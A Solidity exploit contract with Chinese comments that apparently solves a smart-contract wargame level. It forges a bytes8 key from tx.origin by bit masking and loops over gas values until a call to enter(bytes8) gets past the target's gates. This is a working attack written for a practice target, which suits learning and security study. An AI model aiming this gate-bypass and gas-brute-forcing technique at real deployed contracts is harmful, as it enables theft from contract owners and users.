// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// 这次就不定义目标合约接口了，直接 abi.encodeWithSignature() 生成calldata
//interface Elevator {
  //function goTo(uint _floor) external;
//}

contract Exploit {

    address public target; 
    uint256 public counter;

    constructor(address _target) {
        target = _target; 
    }

    function attack() public {
        // 首先结合以上三个要求，通过位运算逆推出 key:
        // key长度8个字节, 其中第5、6个字节 == 00 00 ，第 7、8 字节 == tx.origin 的最后两个字节，前四个字节随意（但不能全0）
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        bool result; // call() 只会返回 true 或 false，不抛出 revert
        //累加 gas 尝试调用 enter(bytes8)，直到调用成功返回 true 为止
        for (uint256 i = 0; i < 150; i++) {
            (bool result, bytes memory data) = address(target).call{gas:i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));
            if (result) {
                break;
            }
        }
    }

}
